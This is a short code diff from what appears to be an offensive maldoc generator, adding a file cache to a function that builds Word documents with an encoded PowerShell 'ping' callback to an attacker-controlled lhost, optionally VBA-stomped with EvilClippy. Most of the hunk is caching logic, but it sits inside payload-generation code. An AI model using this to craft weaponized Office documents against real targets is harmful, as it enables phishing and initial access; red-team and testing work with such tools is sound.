@@ -1147,6 +1147,16 @@ def generate_word_pingback_aes(lhost, lport, proxy, id, stomp_version, template_
         ps_type = "ps_proxy"
     else:
         ps_type = "ps"
+    output_file_path = f"/tmp/PINGBACK_{pathlib.Path(template_path).stem}_{lhost}_{lport}_{proxy}_{id}_{stomp_version}.doc".replace(' ', '_').strip()
+
+    output_file_path_cache = output_file_path
+    if stomp_version:
+        output_file_path_cache = output_file_path.replace(".doc", "_EvilClippy.doc")
+    
+    if os.path.exists(output_file_path_cache):
+        # cached
+        with open(output_file_path_cache, 'rb') as f:
+            return BytesIO(f.read())
     command_text = f"ping -n 1 {lhost}"
     password = str(uuid.uuid4()).replace('-', '')
     encoded_powershell_command = encode_ps(command_text)
